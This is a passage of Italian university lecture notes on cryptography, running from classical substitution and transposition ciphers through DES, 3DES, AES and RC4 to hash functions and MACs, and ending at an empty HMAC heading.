Più le dimensioni del file di copertura sono grandi e più grande è il
messaggio che si può nascondere al suo interno.

Alcuni tool di steganografia:

- `Stegano.exe` (molto semplice da usare, poco adatto a trasmissioni
  "serie");
- `Steghide` e `SilentEye` (per le immagini);
- `MP3stego` (per file audio)

Il #strong[watermarking] è un esempio di steganografia utilizzata per
proteggere il #strong[copyright] di file multimediali in rete. Il
watermarking può essere sia visibile che invisibile.

La steganografia si può combinare con la cifratura.

= Lezione 10 - crittografia classica

Il livello di segretezza di un testo cifrato dipende da 2 fattori:

- #strong[cifrario] (algoritmo) utilizzato, che nella crittografia
  classica veniva mantenuto segreto;
- #strong[complessità della chiave], che determina il modo con cui il
  messaggio viene cifrato

I cifrari classici utilizzano sempre degli #strong[algoritmi simmetrici]
e si basano su operazioni di #strong[sostituzione] e/o
#strong[trasposizione]:

- i cifrari a sostituzione consistono nel #strong[sostituire] ogni
  lettera con un'altra (es. cifrario di Cesare: ogni lettera viene
  shiftata di $n$ posizioni);
- i cifrari a trasposizione consistono nel #strong[permutare] i
  caratteri all'interno di una parola (es. formando degli
  #strong[anagrammi])

== Differenza tra codifica e cifratura

Per rendere segreto un messaggio, si utilizza un #strong[alfabeto
sostitutivo].

Tutti i destinatari autorizzati a leggere il messaggio devono avere una
copia dell'alfabeto sostitutivo, o almeno un modo per poterlo
ricostruire (es. tramite una chiave).

- nella #strong[codifica], l'alfabeto sostitutivo utilizza simboli
  diversi rispetto all'alfabeto originale;
- nella #strong[cifratura], l'alfabeto sostitutivo utilizza gli stessi
  simboli di quello originale

== Cifrari a sostituzione

=== Algoritmi di shifting (es. Cesare, ecc.)

L'alfabeto sostitutivo utilizza delle lettere shiftate in avanti di $n$
posizioni.

In un alfabeto da 26 lettere, dato un carattere in chiaro $x$, il
corrispondente carattere cifrato $y$ cifrato si ottiene in questo modo:
$ y eq lr((x plus n)) #h(0em) mod med 26 $

La chiave per ricostruire l'alfabeto sostitutivo è $n$ stesso.

In un alfabeto da 26 lettere ci sono solo 25 possibilità di rotazione,
quindi 25 possibili chiavi. La crittoanalisi a forza bruta quindi
risulta particolarmente semplice.

=== Cifrari affini

Generalizzazione del cifrario di Cesare dove si introduce un
coefficiente moltiplicativo $a$ che è #strong[primo] con il numero di
lettere dell'alfabeto. $ y eq lr((a x plus n)) #h(0em) mod med 26 $

=== Cifrario basato su alfabeto sostitutivo

L'alfabeto sostitutivo si ottiene tramite una #strong[rotazione casuale]
di #strong[tutte] le lettere:

#image("assets/a15caecedd49edf45503ae587d2ee67e.png")

In questo caso la chiave è l'intero alfabeto sostitutivo.

In alternativa si può introdurre una #strong[chiave] che "riassume" la
modifica fatta all'alfabeto originale:

#image("assets/7ee1b8aba5eec04985f7ac560db353b9.png")

Entrambe le modalità hanno la stessa robustezza. Si preferisce usare
quella con chiave per una maggiore semplicità di gestione (i
partecipanti devono solo scambiarsi la chiave, non l'intero alfabeto).

I cifrari basati su alfabeto sostitutivo sono molto più resistenti ad
attacchi brute force (per 26 lettere ci sono $26 excl$ possibili
combinazioni), ma sono vulnerabili a crittoanalisi #strong[statistica].
La semplice tecnica di sostituzione #strong[mono-alfabetica] non
modifica le #strong[frequenze] relative alle lettere.

== Crittoanalisi statistica

Consiste nello sfruttare delle #strong[statistiche della lingua] per
riuscire a crittoanalizzare un messaggio, ad esempio:

- frequenza delle lettere, dei bigrammi e dei trigrammi (es. `the` in
  inglese);
- affinità e repulsione tra lettere (es. in italiano la lettera `Q` è
  sempre seguita da una `U` e la lettera `N` non è mai seguita da una
  `P`);
- aspetti semantici (es. soggetto-verbo-complemento in italiano)

Tutti i cifrari monoalfabetici sono vulnerabili a crittoanalisi
statistica, perché non mascherano l'#strong[identità] di una lettera.

== Cifrari misti e poli-alfabetici

=== Nomenclatori

Tecnica che combinava sia cifratura che codifica:

- le lettere venivano permutate;
- alcune parole di uso comune venivano sostituite da caratteri runici

Nel corso dei secoli i simboli dei nomenclatori aumentarono sempre di
più, rendendone anche più complicata la gestione.

=== Cifrari per sostituzione omofonica

Ogni lettera può essere sostituita da un altro elemento appartenente ad
un insieme di $n$ simboli, dove $n$ è proporzionale alla frequenza della
lettera.

Lo scopo di questa tecnica è #strong[appiattire] la distribuzione delle
frequenze in modo da non rendere più efficacie la loro analisi.

==== Le grand Ciffre

Esempio di cifrario per sostituzione omofonica.

Utilizzava un #strong[libro codice] che definiva:

- un simbolo per ogni lettera dell'alfabeto francese più comune;
- un simbolo per ogni sillaba dell'alfabeto francese più comune

=== Cifrario Playfair

Cifra dei #strong[bigrammi] anziché lettere singole.

Più robusto alla crittoanalisi per frequenza perché ci sono $26^2$
possibili bigrammi anziché solo 26 lettere.

È stato ritenuto sicuro per diversi secoli, ma con l'avvento dei
computer si è dimostrato essere meno sicuro di quanto ipotizzato.

== Cifrari poliaflabetici

Utilizzano più alfabeti di sostituzione anziché uno solo.

L'$i$-esima lettera viene sostituita con l'$i$-esimo alfabeto.

I cifrari polialfabetici sono più resistenti alla crittoanalisi per
frequenza, grazie all'uso di alfabeti diversi.

=== Cifrario di Vigenère

Cifrario di Cesare multiplo.

Si utilizza una chiave di $d$ lettere:
$K eq k_1 comma k_2 comma dot.basic dot.basic dot.basic comma k_d$, dove
l'$i$-esima lettera specifica l'$i$-esimo alfabeto da utilizzare.

Si utilizza quindi #strong[un alfabeto per ogni lettera da cifrare].

Per semplificare le operazioni di cifratura e decifratura, Vigenère
propose l'uso della #strong[tavola di Vigenère]. Consisteva in una
#strong[matrice quadrata] dove in ogni riga c'è un alfabeto shiftato di
una posizione rispetto alla riga precedente:

#image("assets/50949eaf0c454314b0aac41c338046d8.png")

L'incrocio tra l'$i$-esima lettera da cifrare (nella 1° riga) con
l'$i$-esima lettera della chiave (1° colonna) contiene il carattere
cifrato.

Il cifrario di Vigenère è stato considerato sicuro per diversi secoli,
nonostante la difficoltà nella gestione dovuta alla scarsa praticità
della tabella.

Il punto debole dell'algoritmo sta nella #strong[lunghezza della
chiave]: due lettere cifrate a distanza $n$ (con $n$ lunghezza della
chiave) sono cifrate con lo stesso alfabeto.

=== Crittoanalisi per cifrari polialfabetici

+ identificare la lunghezza $L$ della chiave;
+ suddividere il testo cifrato in blocchi da $L$ caratteri;
+ applicare a ciascun blocco un algoritmo di crittoanalisi per frequenza

Per risalire alla lunghezza della chiave:

+ ricercare #strong[sequenze di caratteri identici] nel testo cifrato;
+ calcolare la distanza $t$ tra gli #strong[inizi] di queste sequenze;
+ identificare #strong[tutte] le sequenze identiche nel testo cifrato e
  calcolare le varie distanze
  $t_1 comma t_2 comma dot.basic dot.basic dot.basic comma t_k$;
+ la lunghezza della chiave è un multiplo di tutti questi $t_i$, quindi
  $L eq M C D lr((t_1 comma t_2 comma dot.basic dot.basic dot.basic comma t_k))$.

=== Cifrari auto-chiave

Per risolvere la debolezza dovuta alla lunghezza della chiave, Vigenère
proposte l'uso di una chiave lunga quanto il testo da cifrare:

- si sceglie una chiave;
- la si concatena al testo da cifrare;
- la stringa così ottenuta è la chiave con cui cifrare il testo

Questi cifrari sono comunque soggetti a caratteristiche di frequenza
(che stavolta stanno nella chiave) che permettono la crittoanalisi
statistica.

=== One Time Pad

Principi base:

- la chiave è #strong[lunga quanto il testo] da cifrare;
- la chiave dev'essere scelta in modo #strong[completamente casuale]
  (non è sufficiente concatenare una parola al testo da cifrare);
- non si deve mai riutilizzare la stessa chiave

Si tratta dell'unico schema #strong[incondizionatamente sicuro] perché
non usa mai ripetizione.

L'OTP presenta alcuni problemi quando lo si cerca di implementare:

- generare grandi quantità di chiavi #strong[realmente casuali] è molto
  complicato;
- difficoltà nel #strong[distribuire] a tutti gli interlocutori blocchi
  sufficientemente lunghi di chiavi per poter cifrare i messaggi
  - e successiva difficoltà nel gestire la #strong[sincronizzazione] tra
    i diversi interlocutori (quando qualcuno utilizza una chiave, tutti
    gli altri NON devono mai più riutilizzarla);
- protezione del "pad" (i.e.~un taccuino con tutte le chiavi) da
  copie/furti

==== Problema del riutilizzo della chiave

Supponendo di usare la stessa chiave per 2 messaggi:

- $C_1 eq M_1 xor K$;
- $C_2 eq M_2 xor K$

Se il crittoanalista intercetta $C_1$ e $C_2$ può sfruttare questa
proprietà dello XOR:
$ C_1 xor C_2 eq lr((M_1 xor K)) xor lr((M_2 xor K)) eq M_1 xor M_2 $

Mediante tecniche di crittoanalisi statistica, se i messaggi sono
sufficientemente lunghi è possibile ricavare $M_1$ ed $M_2$.

==== OTP e computer

Con l'avvento dei computer è diventato molto semplice generare dei
numeri #strong[pseudo-casuali].

OTP implementati attraverso generazione di numeri pseudo-casuali però
non sono inviolabili (i numeri devono essere scelti in maniera
#strong[realmente casuale]).

== Cifrari per trasposizione

L'obiettivo della sostituzione è la #strong[confusione], ovvero rendere
difficile capire come il messaggio è stato cifrato.

L'obiettivo della trasposizione è la #strong[diffusione]: le
informazioni nel messaggio vengono #strong[sparse] nel messaggio cifrato
in modo da eliminare la debolezza alla crittoanalisi delle adiacenze.

Esempio: trasposizione colonnare:

- si scrive il messaggio in chiaro suddividendolo in diverse righe
  ciascuna composta da un numero fissato di caratteri;
- il messaggio cifrato lo si ottiene leggendo i caratteri #strong[per
  colonne]

#image("assets/ae8e7cac9b869eb61889573e4916d93b.png")

Altro esempio: lo scitale, usato dagli spartani.

== Cifrari prodotto

Consiste nella combinazione di due o più tecniche di cifratura (es.
sostituzione e trasposizione).

Se si esegue una sostituzione e poi una trasposizione, si ottiene un
cifrario completamente nuovo e molto più robusto rispetto al ripetere
più volte la stessa operazione.

Questa combinazione rappresenta il ponte tra la crittografia classica e
quella moderna.

=== Algoritmo ADFGVX

Costituito da 2 fasi:

- la fase di sostituzione consiste nel sostituire ogni lettera del testo
  in chiaro con una #strong[coppia] di lettere, a partire da una tabella
  di sostituzione (sempre uguale);

#image("assets/86407b173d2be8e157538c5345a19958.png")

- la fase di trasposizione è basata su una chiave. Consiste nello
  scrivere il messaggio su più righe, ciascuna delle quali di lunghezza
  pari alla chiave, per poi leggere per colonne la tabella così ottenuta

#image("assets/51dc64c7ccabafe37171b92a754affce.png")

Questo algoritmo è molto più robusto dei precedenti, ma ha ancora dei
margini di miglioramento:

- effettua un solo passo di sostituzione e trasposizione;
- la tabella di sostituzione è fissa e non dipende dalla chiave

== Code talkers (e.g.~"parlare in codice")

Meccanismo alternativo alla crittografia nato a seguito della diffusione
dei nuovi mezzi di comunicazione.

= Lezione 11 - crittografia simmetrica

== Macchine cifranti e avvento dei computer

Le #strong[macchine cifranti] sono state introdotte a partire dal 1908
per #strong[automatizzare] multipli step di sostituzione e
trasposizione.

Nelle #strong[macchine a rotori], la chiave era la posizione iniziale di
questi rotori.

Con l'avvento dei computer:

- è stato possibile automatizzare il processo di cifratura;
- la #strong[crittoanalisi per forza bruta] ritorna rilevante, anche per
  misurare la robustezza di un cifrario;
- tutto diventa in #strong[formato binario], quindi tutto è cifrabile
  (non c'è differenza tra testo, video, ecc.)

== Principio di Kerchoff della crittografia moderna

Se le chiavi sono #strong[segrete] e di #strong[lunghezza adeguata],
allora non ha importanza mantenere segreti gli algoritmi di
crittografia, perché:

- la crittoanalisi non ha bisogno di conoscere gli algoritmi;
- rendere l'algoritmo pubblico aiuta a rilevare il prima possibile
  eventuali debolezze

== Cifrari a blocco

Operano su un #strong[blocco] di testo in chiaro di $n$ bit e producono
un blocco cifrato di $n$ bit.

I cifrari a blocchi appaiono come un processo di #strong[sostituzione]
di tutti i bit del blocco:

#image("assets/b729f5e9e1df26a68e00d9a8f76f5f22.png")

Con un blocco di $n$ bit ci sono $2^n$ possibili blocchi in chiaro.
Affinché il processo di cifratura sia invertibile:

- ogni blocco in chiaro deve dare origine ad #strong[un solo] blocco
  cifrato;
- due blocchi in chiaro non devono generare lo stesso blocco cifrato

quindi con un blocco da $n$ bit ci sono $2^n excl$ possibili blocchi
cifrati.

=== Cifrario a blocchi ideale

Cifrario che permette di avere il massimo numero di possibili cifrature
per un blocco da $n$ bit, ovvero $2^n excl$.

La chiave per la cifratura è la tabella che associa ogni possibile
blocco in chiaro con il corrispondente blocci cifrato:

#figure(
  image("assets/e2cf70f89730a03cc5249a2983747768.png", height: 35%),
  caption: [Mapping plaintext $->$ ciphertext]
)

Problemi di questo cifrario:

- è equivalente ad un classico meccanismo di #strong[sostituzione],
  dunque vulnerabile a crittoanalisi statistica per $n$ sufficientemente
  grandi;
- la lunghezza della chiave è data da $n times 2^n$ ($2^n$ righe nella
  tabella con $n$ bit per ogni riga) ed è una dimensione
  #strong[spropositata] (se $n eq 64$, la dimensione della chiave è
  $64 times 2^64$ bit \= $1 comma 4 times 10^11$ GB)

=== Idee di Shannon

Nel 1949 Shannon teorizzò che un algoritmo di cifratura sicuro deve
possedere due proprietà fondamentali:

- #strong[confusione]: la relazione tra la chiave e il testo cifrato
  dev'essere quanto più complessa e non correlata possibile in modo da
  non poter risalire alla chiave conoscendo solo il testo cifrato.
  Questo si ottiene utilizzando degli algoritmi di #strong[sostituzione]
  molto complessi;
- #strong[diffusione]: l'algoritmo deve distribuire le
  #strong[correlazioni statistiche] del testo lungo tutto l'alfabeto
  utilizzato dall'algoritmo di cifratura, rendendo il più complessi
  possibile attacchi di crittoanalisi statistica. In altre parole, ogni
  bit del testo cifrato dev'essere influenzato da tanti bit, in posti
  diversi, del testo in chiaro. Si ottiene applicando varie
  #strong[permutazioni] sui dati in ingresso

=== Cifrario di Feistel

Ideato nel 1973.

Basato sulle idee di Shannon e sul cifrario prodotto.

Il cifrario di Feistel mira a risolvere i problemi del cifrario a
blocchi ideale.

Questo cifrario alterna #strong[sostituzioni] e #strong[permutazioni].

La chiave usata è lunga $k$ bit per un blocco da $n$ bit (\= $2^k$
possibili trasformazioni anziché $2^n excl$ come nel cifrario ideale).

Il cifrario di Feistel utilizza 3 funzioni base:

- #strong[S-Box]: funzione che effettua la #strong[sostituzione] dei
  bit;
- XOR;
- #strong[P-Box]: funzione per la #strong[permutazione] dei bit

==== Algoritmo

+ il blocco da $n$ bit viene suddiviso in 2 parti, una sinistra (`L`) ed
  una destra (`R`);
+ queste due parti vengono elaborate per un certo numero di cicli. Ogni
  ciclo esegue:
  + una #strong[sostituzione] sulla parte sinista, utilizzando l'output
    di una funzione applicata alla parte destra;
  + una #strong[permutazione] che va a scambiare le due metà

==== Variante Lucifer

Variante rafforzata del cifrario di Feistel.

- l'input è un testo in chiaro di $2 w$ bit;
- utilizza una chiave $K$;
- utilizza una funzione $F$ che seleziona alcuni bit, ne duplica altri e
  li permuta

Nell'$i$-esimo ciclo si ha:

- input $L_(i minus 1)$, $R_(i minus 1)$, chiave $K_i$ (derivata da
  $K$);
- si applica una #strong[sostituzione] sulla parte sinistra:
  - $L_i eq L_(i minus 1) xor F lr((R_(i minus 1) comma K_i))$;
- si applica una #strong[permutazione] che scambia parte sinistra con
  parte destra

Alla fine, il testo cifrato è dato dalla concatenazione di
$L_(n plus 1)$ con $R_(n plus 1)$.

==== Sicurezza

La sicurezza del cifrario di Feistel dipende da:

- #strong[dimensione del blocco]: + dimensione \= + sicurezza, -
  velocità dell'algoritmo. Tradizionalmente si usano blocchi da 64 bit;
- #strong[dimensione della chiave]: + dimensione \= + sicurezza, -
  velocità dell'algoritmo. Tradizionalmente si usa una chiave di 64 bit
  (Lucifer ne usava una da 128 bit). Cifrari con chiave di dimensione
  $lt$ 64 bit sono considerati insicuri;
- #strong[numero di cicli]: pochi cicli sono inadeguati per la
  sicurezza, ma troppi cicli sono inutili. Tipicamente si usano 16
  cicli;
- #strong[funzione F]: + complessità \= + robustezza rispetto alla
  crittoanalisi

==== Decifratura

L'algoritmo di decifratura è lo stesso della cifratura, ma si utilizzano
le chiavi $K_1 comma dot.basic dot.basic dot.basic comma K_n$ in ordine
inverso.

Questa è una proprietà fondamentale che verrà "tramandata" anche a tutti
gli algoritmi basati sul cifrario di Feistel, in quanto consente di non
dover progettare due algoritmi distinti per cifratura e decifratura.

=== Cifrario DES

Sviluppato verso la metà degli anni '70, è stato destinato all'utilizzo
da parte del pubblico nel 1997.

Fino al 1994 esistevano solo implementazioni hardware.

L'algoritmo in realtà dovrebbe essere chiamato #strong[Data Encryption
Algorithm] (DEA). DES è soltanto il nome dello standard.

Il cifrario DES utilizza blocchi da 64 bit e chiavi da 64 bit (anche se
in realtà sono 56, perché 8 bit della chiave sono utilizzati per il
controllo di parità).

==== Algoritmo

Il cifrario DES è molto simile in struttura a quello di Feistel:

+ si esegue una permutazione iniziale;
+ si eseguono 16 cicli che applicano sia sostituzioni (S-Box) che
  permutazioni (P-Box);
+ parte destra e sinistra dell'output si scambiano per ottenere un
  #strong[pre-output];
+ il pre-output viene inviato all'#strong[inversa] della funzione di
  permutazione iniziale

Per ognuno dei 16 cicli, si genera una chiave $K_i$ #strong[sempre
diversa], di lunghezza 48 bit, tramite i seguenti passi:

+ si prendono 56 bit dalla chiave $K$, scartando l'ultimo bit di ogni
  byte;
+ si suddivide la chiave in 2 parti;
+ si effettua uno #strong[shift circolare] a sinistra;
+ si passa l'output ad una #strong[funzione di permutazione e
  contrazione] che restituisce un output di 48 bit (dai 56 iniziali);
+ si espande la parte destra del blocco da cifrare (32 bit) a 48 bit;
+ si effettua lo XOR tra parte destra e chiave da 48 bit

L'algoritmo per la decifratura è lo stesso della cifratura.

==== Robustezza di DES

Inizialmente si mise in dubbio la reale sicurezza di DES, dato l'uso di
chiavi a soli 56 bit (quando Lucifer ne utilizzava una da 128). Si
riteneva infatti che una chiave di queste dimensioni non fosse sicura
rispetto ad attacchi a forza bruta, ma all'epoca non si avevano risorse
sufficienti per poterlo dimostrare.

Queste critiche erano motivate anche dal fatto che una parte
dell'algoritmo era stata mantenuta #strong[segreta] dal NIST.

A parte le dietrologie, anche gli attacchi più potenti hanno dimostrato
che DES utilizza una struttura molto robusta. Le sue versioni successive
sono ben lontane dall'essere violate da attacchi a forza bruta.

La robustezza principale di DES sta nel suo significativo
#strong[effetto valanga] (come da idea di Shannon): tanti bit nel testo
in chiaro influenzano un singolo bit del testo cifrato.

Dal 1999 ormai DES è utilizzato solo per sistemi legacy, mentre per il
resto si usa 3DES oppure AES.

=== Double DES

Primo tentativo fatto dal NIST per potenziare DES.

Prevede l'utilizzo di due chiavi: $K_1$ e $K_2$.

Il messaggio cifrato $C$ si ottiene effettuando #strong[due cifrature]
DES: $ C eq E lr((K_2 comma E lr((K_1 comma P)))) $

analogamente, per decifrare si eseguono due decifrature (con le chiavi
al contrario): $ P eq D lr((K_1 comma D lr((K_2 comma C)))) $

L'idea del 2DES è quella di avere una robustezza pari a quella che si
avrebbe con l'utilizzo di una chiave singola da 112 bit (56 + 56 bit).

In realtà così non è, si è dimostrato infatti che la difficoltà
dell'analisi a forza bruta è solo raddoppiata (da $2^56$ a $2^57$).

==== Attacco meet-in-the-middle

Attacco per trovare la chiave usata da 2DES, conoscendo il testo in
chiaro $P$ e la sua cifratura $C$.

Per com'è strutturato 2DES, vale:

- $C eq E lr((K_2 comma E lr((K_1 comma P))))$;
- $X eq E lr((K_1 comma P)) eq D lr((K_2 comma P))$

quindi, per trovare la chiave:

+ si cifra $P$ per tutti i possibili $2^56$ valori di $K_1$;
+ si memorizzano i risultati in una tabella ordinata per valore di $X$;
+ si decifra $C$ utilizzando tutti i possibili $2^56$ valori di $K_2$;
+ per ogni valore restituito, si controlla se c'è un valore
  corrispondente nella tabella creata al punto 2;
+ se questo valore esiste, è stata trovata anche la chiave

Possibile soluzione: utilizzo di 3 passi di cifratura con 3 chiavi
differenti.

Problema: lunghezza complessiva della chiave di 168 bit ($56 times 3$),
impraticabile per la tecnologia dell'epoca.

=== Triple DES (3DES)

Evoluzione di 2DES.

Utilizza una coppia di chiavi $K_1$ e $K_2$, ma si applicano in 3
operazioni di encrypt-decrypt-encrypt:
$ C eq E lr((K_1 comma D lr((K_2 comma E lr((K_1 comma P)))))) $

3DES è un'alternativa molto popolare a DES. Ha il grandissimo vantaggio
di essere retrocompatibile con il DES base, infatti:
$ C eq E lr((K_1 comma D lr((K_1 comma E lr((K_1 comma P)))))) eq E lr((K_1 comma P)) $

3DES è molto più robusto di DES, con un #strong[livello di sicurezza]
stimato in $2^80$ bit (che sarebbe sufficiente ancora oggi per molte
applicazioni).

Oggi sarebbe possibile incrementare ancora di più il livello di
sicurezza di 3DES utilizzando 3 chiavi anziché 2:
$ C eq E lr((K_3 comma D lr((K_2 comma E lr((K_1 comma P)))))) $

portando il livello di sicurezza a $2^112$.

Quest'ultimo cifrario è alla base di molte applicazioni Internet (es.
PGP e S/MIME).

Presenta comunque alcuni problemi:

- implementazione poco efficiente;
- limitato a blocchi di 64 bit, ormai troppo piccoli per le tipiche
  dimensioni delle comunicazioni attuali

=== AES

Algoritmo scelto come standard USA nel 2001 per rimpiazzare DES.

Molto efficiente e facile da implementare a livello software.

Utilizza blocchi da 128 bit. Rispetto a DES e Feistel, non divide il
blocco a metà ma opera sempre con l'intero blocco.

4 cicli:

+ sostituzione dei bit del blocco, sfruttando una tabella di
  sostituzione;
+ shift delle righe;
+ mescolamento delle colonne;
+ aggiunta della sottochiave

Ogni passo è ripetuto diverse volte in base alla dimensione della chiave
utilizzata.

==== Algoritmo

La chiave e il blocco da cifrare vengono rappresentati con una matrice
di $4 times 4$ byte.

Le matrici di byte che rappresentano le varie trasformazioni dei blocco
di testo in chiaro iniziale vengono chiamati #strong[stati].

Si genera poi una chiave $K_1$ (partendo dalla chiave $K$) e si cifra
ogni byte della matrice.

Successivamente si eseguono un certo numero di cicli. Ogni ciclo esegue
le seguenti operazioni:

+ ogni byte della matrice viene sostituito secondo una tabella di
  sostituzione;

#image("assets/AES-SubBytes.svg")

+ ogni riga della matrice viene #strong[shiftata verso sinistra]. Il
  numero di posizioni di cui ogni byte viene shiftato è dato da
  `numeroRiga - 1`;

#image("assets/AES-ShiftRows.svg")

#block[
#set enum(numbering: "1.", start: 3)
+ si esegue una #strong[sostituzione per colonne] dei byte nella matrice
  (ogni colonna è sostituita in funzione dei byte presenti nella colonna
  stessa). Quest'ultimo passo viene saltato dall'ultimo ciclo;
]

#image("assets/AES-MixColumns.svg")

#block[
#set enum(numbering: "1.", start: 4)
+ si genera una chiave $K_i$ e si cifra, tramite XOR, ogni byte della
  matrice
]

#image("assets/AES-AddRoundKey.svg")

== Cifrari a flusso

Lavorano tipicamente su un byte alla volta anziché su blocchi da $n$
bit.

Ad ogni passo viene generata una chiave pseudo-casuale, chiamata
#strong[stream key].

Il corrispondente byte cifrato si ottiene mediante XOR del byte del
testo in chiaro con la stream key.

Con questo approccio, conoscendo solo due componenti (testo in charo e/o
cifrato e/o chiave), è possibile risalire al terzo:

- conoscendo testo in chiaro e testo cifrato, è possibile ottenere la
  chiave (si inverte lo XOR);
- conoscendo due testi cifrati con la stessa chiave è possibile ottenere
  lo XOR dei due testi in chiaro

Quindi:

- non bisogna mai riutilizzare la stessa chiave;
- la stream key dev'essere sempre diversa

=== Robustezza

I cifrari a flusso assomigliano molto al cifrario One-Time Pad, con
l'eccezione che le stream key sono generate pseudo-casualmente e non
casualmente.

La pseudo-casualità combinata con lo XOR cancella ogni proprietà
statistica del testo.

La sicurezza di un cifrario a flusso dipende principalmente dal
generatore di numeri pseudo-casuali. Se si ha a disposizione un buon
generatore, la sicurezza di un cifrario a flusso è pari a quella di un
cifrario a blocchi, con il vantaggio però di essere molto più semplice
da implementare.

=== Proprietà che deve avere la stream key

- essere il più casuale possibile. + casualità \= + sicurezza;
- essere calcolata a partire da una chiave sufficientemente lunga
  (almeno 128 bit), per proteggersi da crittoanalisi a forza bruta;
- derivare da una sequenza di numeri pseudo-casuali con il
  #strong[periodo] (ovvero il numero di elementi dopo i quali si ripete
  la stessa frequenza) più lungo possibile

=== RC4

Cifrario a flusso molto utilizzato nel passato (SSL, chiavi WEP,
gestione password su Windows, ecc.).

Dopo una fase di inizializzazione, effettua una #strong[permutazione
casuale], basata sulla chiave, di ciascuno degli 8 bit.

Il generatore di numeri pseudo-casuali ha un periodo enorme
($gt 10^100$).

==== Debolezze

Stanno tutte nel #strong[PNRG] (Pseudo Number Random Generator):

- i primi 256 byte del #strong[keystream] (la sequenza di caratteri
  pseudo-casuali da concatenare tramite XOR al testo in chiaro) non sono
  realmente casuali. Molte implementazioni li scartano eseguendo i primi
  256 cicli a vuoto;
- la chiave ed il keystream sono fortemente collegati tra loro
  (violazione di una delle idee di Shannon)

RC4 inoltre è vulnerabile a #strong[bit flipping attack]. Si tratta di
un attacco di tipo man-in-the-middle dove l'attaccante intercetta il
messaggio cifrato e cambia 1 singolo bit di esso. Si tratta di un
attacco molto pericoloso in schemi di comunicazione #strong[rigidi] (es.
bancari):

#image("assets/a9586c49f7a3e6cb2e8eb5db71da73f7.png")

Queste debolezze hanno portato alla deprecazione di RC4. Sono il motivo
principale per cui una chiave WEP è facilmente violabile.

==== Algoritmo

Passo di inizializzazione:

+ si costruisce un vettore di stato $S$ di 256 elementi che contiene una
  permutazione dei primi byte da 0 a 255;
+ si costruisce un vettore temporaneo $T$ di 256 caratteri,
  inizializzandolo con la chiave $K$ (eventualmente ripetendola quanto
  necessario per riempire i 256 caratteri);
+ si usa il vettore $T$ per produrre la permutazione iniziale di $S$;
+ ogni elemento `S[i]` viene scambiato con un altro byte, in funzione di
  `T[i]`;
+ si esegue il passo precedente per 256 volte, ottenendo alla fine un
  vettore $S$ molto ben mescolato

Passo di cifratura:

+ si continuano a scambiare i valori contenuti nel vettore di stato;
+ gli elementi selezionati per lo scambio vengono sommati tra loro
  (modulo 256);
+ il risultato costituisce l'indice del vettore $S$ che contiene la
  stream key;
+ si effettua lo XOR tra questo valore ed il byte del messaggio da
  cifrare

== Integrità

=== Message digest

Si genera un #strong[digest] a partire da un messaggio $m$. Il digest
viene inserito in coda al messaggio ed inviato insieme ad esso.

Al momento della ricezione del messaggio, il destinatario ri-calcolerà
il digest e lo confronterà con quello ricevuto. Se combaciano, allora il
messaggio non è stato alterato.

=== Funzioni hash

Il digest viene calcolato tramite una #strong[funzione hash] $h$. Si
tratta di funzioni matematiche con proprietà particolari:

- devono avere #strong[bassa complessità computazionale] (il calcolo del
  digest dev'essere rapido);
- #strong[non invertibilità]: dato $y$ dev'essere impossibile (o
  computazionalmente impossibile) trovare un messaggio $m$ tale che
  $h lr((m)) eq y$;
- #strong[non invertibilità con preimmagine nota]: dato $m$, dev'essere
  impossibile trovare un messaggio $m prime eq.not m$ tale che
  $h lr((m prime)) eq h lr((m))$;
- deve essere #strong[fortemente resistente alle collisioni]: dev'essere
  impossibile trovare due messaggi $m_1 comma m_2$ tali che
  $h lr((m_1)) eq h lr((m_2))$;
- deve restituire un digest in modo #strong[uniforme] per ogni messaggio
  $m$

Poiché l'insieme dei messaggi è molto più grande dell'insieme dei
possibili digest, nella pratica si accetta che $h$ sia solo
#strong[debolmente] resistente alle collisioni. Trovare delle collisioni
deve però essere computazionalmente intrattabile.

==== Esempio di funzione hash semplice

Partendo da un messaggio $m$ lungo $L$ bit, si vuole ottenere un digest
di $n$ bit, con $L gt gt n$.

+ si suddivide il messaggio in $k$ blocchi da $n$ bit l'uno, tali che
  $k eq L / n$;
+ si dispone ciascun blocco su una riga in modo da avere una matrice
  $n times k$;
+ si calcola $i$-esimo bit dell'hash tramite XOR degli elementi
  dell'$i$-esima colonna, ovvero:

$ h_i eq m_(1 i) xor m_(2 i) xor dot.basic dot.basic dot.basic xor m_(k i) $

Problema: questa funzione hash non è robusta.

==== Message Digest (MD)

Famiglia di funzioni per la generazione di un hash.

La funzione più famosa di questa famiglia è #strong[MD5], che genera un
hash a 128 bit.

Al momento è considerato "not recommended" dall'IETF in quanto la
piccola dimensione lo rende vulnerabile a #strong[birthday attacks] (in
sostanza servono solo $2^64$ operazioni, anziché $2^128$, per trovare
una collisione).

==== Secure Hash Algorithm (SHA)

Altra famiglia di funzioni per la generazione di un hash.

SHA-1 è stata utilizzata in tantissime applicazioni e protocolli (SSL,
PGP, SSH, ecc.).

SHA-1 produce un digest di 160 bit. La lunghezza massima del messaggio
in input è di $2^64 minus 1$ bit.

L'algoritmo è simile alla funzione di hashing semplice già vista:

+ si costruisce una matrice;
+ i blocchi del messaggio sono elaborati mediante una serie di cicli che
  usano una #strong[funzione di compressione] che combina il blocco
  corrente con il risultato ottenuto nel round precedente

La robustezza dell'hashing SHA-1 sta nella funzione di compressione:
deve essere costruita in modo tale che ogni bit di input influenzi il
maggior numero di bit in output.

Nel 2005 è stato dimostrato che sono sufficienti $2^69$ operazioni
(invece delle previste $2^80$) per rilevare collisioni.

Già da diversi anni esistono sotto-famiglie che utilizzano più bit
(SHA-2 e SHA-3).

==== WHIRPOOL

Funzione di hashing che prende in input un messaggio di lunghezza
massima $2^256$ bit e restituisce un digest di 512 bit.

Si basa su una cifratura a blocchi quadrata, analoga a quella utilizzata
da AES.

Algoritmo libero da copyright.

==== Limiti delle funzioni hashing

Non c'è #strong[autenticazione] relativa al mittente. Il destinatario
può verificare l'integrità del messaggio, ma non sa se quel messaggio
gli sia arrivato dal mittente vero o da qualcuno che si spaccia per lui.

Soluzione: funzioni MAC.

=== Funzioni MAC

Le funzioni MAC generano un #strong[tag]. Oltre al messaggio, richiedono
anche una #strong[chiave] $K$.

+ il mittente genera un tag e lo inserisce in coda al messaggio;
+ il destinatario ri-calcola il tag e lo controlla con quello del
  messaggio

Mittente e destinatario condividono la stessa chiave segreta $K$.

Una funzione MAC è simile alla crittografia simmetrica, ma #strong[non
deve essere reversibile] (l'obiettivo non è decifrare il tag ma solo
confrontarlo con un altro).

La funzione MAC non può essere considerata una firma digitale, perché
entrambi gli interlocutori condividono la stessa chiave $K$ e quindi non
c'è garanzia dell'#strong[univocità del mittente].

==== HMAC

